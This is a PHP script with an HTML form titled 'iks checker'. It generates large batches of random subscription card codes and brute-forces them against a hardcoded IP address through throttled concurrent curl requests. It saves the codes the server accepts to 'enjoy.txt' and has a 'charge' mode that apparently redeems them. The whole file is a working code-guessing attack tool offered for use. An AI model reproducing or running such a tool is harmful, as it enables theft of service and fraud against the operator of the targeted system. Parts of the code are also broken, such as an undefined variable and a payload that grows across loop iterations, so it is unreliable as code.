<!DOCTYPE html>
<html>

<head>
    <title>
        iks checker by kalou
    </title>
</head>

<body style="text-align:center;">

    <h1 style="color:green;">
        iks card_no checker
    </h1>

    <form method="post">
        <br>
        <div>
            <label>lenght : </label>
            <input type="text" name="repeat">
            <input type="submit" name="check" value="check" />
        </div>
        <br>
        <div>
            <label>Card_NO : </label>
            <input type="text" name="card_no" value="">
            <input type="submit" name="query" value="query">
        </div>
        <br>
        <div>
            <label>lenght : </label>
            <input type="number" name="codes_lenght" min="1000" max="25000" value="1000" step="100">
            <label>package : </label>
            <select name="package">
                <option value="VIP">VIP</option>
                <option value="SUP">Super</option>
            </select>
            <input type="submit" name="gen" value="gen">
        </div>
        <br>
    </form>
</body>

</html>

<?php

//declare(strict_types=1);

set_time_limit(0);
function randPass($length, $strength = 8)
{
    $vowels = 'aeuy';
    $consonants = 'bdghjmnpqrstvz';
    if ($strength >= 1) {
        $consonants .= 'BDGHJLMNPQRSTVWXZ';
    }
    if ($strength >= 2) {
        $vowels .= "AEUY";
    }
    if ($strength >= 4) {
        $consonants .= '0123456789';
    }
    if ($strength >= 8) {
        $consonants .= '-=+.';
    }

    $password = '';
    $alt = time() % 2;
    for ($i = 0; $i < $length; $i++) {
        if ($alt == 1) {
            $password .= $consonants[(rand() % strlen($consonants))];
            $alt = 0;
        } else {
            $password .= $vowels[(rand() % strlen($vowels))];
            $alt = 1;
        }
    }
    return $password;
}

function generateRandom($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $specials = '=+-_.';
    $charactersLength = strlen($characters);

    $randomString = '';

    for ($i = 0; $i < $length - 1; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }

    $randomString .= $specials[rand(0, strlen($specials) - 1)];

    return str_shuffle($randomString);
}

function genCodes($number, $package = "VIP")
{
    $code_no = array();
    switch ($package) {
        case 'VIP':
            $lenght = 12;
            $FirstChar = 'I12';
            break;
        case 'SUP':
            $lenght = 14;
            $FirstChar = 'S';
            break;
    }
    while (count($code_no) <= $number) {
        $codeX = $FirstChar . randPass($lenght);

        if (preg_match('/[^A-Za-z0-9]/', $codeX)) {
            if (getLineWithString($codeX) == -1) {
                array_push($code_no, $codeX);
                $file = fopen('codes.txt', 'a+');
                fwrite($file, $codeX . PHP_EOL);
                fclose($file);
            }
        }
    }
}

function getLineWithString($str)
{
    $lines = file('codes.txt');
    if ($lines !== '') {
        foreach ($lines as $line) {
            if (strpos($line, $str) !== false) {
                return $line;
            }
        }
    }
    return -1;
}

function php_curl($checkCodes)
{
    foreach ($checkCodes as $code) {
        api($code);
    }
}

function api($code)
{
    $url = 'http://194.124.216.122/';
    $post_data['card_no'] = $code;
    $post_data['submit'] = 'query';
    $post_data['action'] = 'yes';
    $post_data['check_valid'] = 'yes';

    foreach ($post_data as $key => $value) {
        $post_items[] = $key . '=' . $value;
    }

    $payload = implode('&', $post_items);

    $ch =  curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);

    $response = curl_exec($ch);
    curl_close($ch);

    $start = stripos($response, "document.getElementById('prompt').innerHTML");
    $end = stripos($response, "</body>");
    $body = substr($response, $start + 46, $end - $start);

    if (!stripos($body, 'Error,Card_NO does not exist') && !stripos($body, 'Error,Invalid Card_NO')) {
        $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
        fwrite($myfile, $code . ':' . $body);
        fclose($myfile);
    }

    print_r(['code' => $code, 'status' => $body]);
    echo '<br>';
}

function php_curl_multi_with_timeout($codes, $timeout_interval = 100, $timeout_sleep = 1)
{
    $url = 'http://194.124.216.122/';
    $ch_index = array();
    $response = array();

    foreach ($codes as $key => $code) {
        $post_data['sn'] = '191122021902';
        $post_data['card_no'] = trim($code);
        $post_data['submit'] = 'charge';
        $post_data['action'] = 'yes';
        $post_data['check_valid'] = 'yes';
        foreach ($post_data as $key => $value) {
            $post_items[] = $key . '=' . $value;
        }
        

        $payload = implode('&', $post_items);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $ch_index[] = $ch;
    }

    $mh = curl_multi_init();
    $request_count = count($ch_index);

    for ($i = 0; $i < $request_count; $i++) {
        curl_multi_add_handle($mh, $ch_index[$i]);

        // Introduce timeout interval
        if (($i + 1) % $timeout_interval === 0 && $i !== 0) {
            usleep($timeout_sleep * 1000000); // Sleep for $timeout_sleep seconds
        }
    }

    do {
        $status = curl_multi_exec($mh, $active);
        if ($active) {
            curl_multi_select($mh);
        }
    } while ($active && $status == CURLM_OK);

    foreach ($ch_index as $key => $ch) {
        $response[] = curl_multi_getcontent($ch);
        curl_multi_remove_handle($mh, $ch);
    }

    curl_multi_close($mh);

    return $response;
}


function execute($number = 0)
{
    $file = fopen('codes.txt', 'r+');
    $setNum = $number != 0 ? $number : count(file('codes.txt'));
    $startNum = 0;
    $endNum = $startNum + $setNum;

    fseek($file, 0); // Move the file pointer to the beginning

    $checkCodes = [];
    for ($i = 0; $i < $setNum; $i++) {
        $checkCodes[] = fgets($file);
    }

    fseek($file, 0); // Move the file pointer to the beginning

    array_shift($fileCounter);
    array_unshift($fileCounter, $endNum);

    $multiArrayCode = array_chunk($checkCodes, 100);
    foreach ($multiArrayCode as $keyX => $codes) {
        $response = php_curl_multi_with_timeout($codes);
        foreach ($response as $key => $value) {
            $start = stripos($value, "document.getElementById('prompt').innerHTML");
            $end = stripos($value, "</body>");
            $body = substr($value, $start + 46, $end - $start);

            if ($body == '') {
                writeToFile('codes.txt', [$codes[$key]]);
            }

            if (!stripos($body, 'Error,Card_NO does not exist') && !stripos($body, 'Error,Invalid Card_NO')) {
                writeToFile('enjoy.txt', [$codes[$key] . ':' . $body]);
                print_r(['code' => $codes[$key], 'status' => $body]);
                echo '<br>';
            }

            if ($number == $key + 1 * $keyX + 1) {
                ob_start();
                echo 'vip iks is end';
                ob_end_clean();
            }

            // Remove code from file after checking
            $lineToRemove = $startNum + $keyX * 100 + $key + 1;
            removeLineFromFile('codes.txt', $lineToRemove);
        }
    }
    fclose($file);
}


function changeCode($newKey)
{
    $file = file('codes.txt');
    $fp = fopen('codes.txt', 'w+');
    foreach ($file as $i => $code) {
        $code[0] = $newKey;
        fwrite($fp, $code);
    }
    fclose($fp);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['check'])) {
        if (isset($_POST['repeat'])) {
            echo 'vip iks is running => ' . $_POST['repeat'] . ' time <br>';
            execute((int)$_POST['repeat']);
        }
    } elseif (isset($_POST['query'])) {
        echo 'check card_no => ' . $_POST['card_no'] . '<br>';
        if (isset($_POST['card_no'])) {
            api($_POST['card_no']);
        }
    } elseif (isset($_POST['gen'])) {
        if (isset($_POST['package']) && isset($_POST['codes_lenght'])) {
            genCodes((int)$_POST['codes_lenght'], $_POST['package']);
        }
    }
}

function writeToFile($filename, $contentArray)
{
    $content = implode("\n", $contentArray);
    file_put_contents($filename, $content, FILE_APPEND);
}

function removeLineFromFile($filename, $lineNumber)
{
    $lines = file($filename);
    if (isset($lines[$lineNumber - 1])) {
        unset($lines[$lineNumber - 1]);
        file_put_contents($filename, implode("", $lines));
    }
}
clearstatcache();
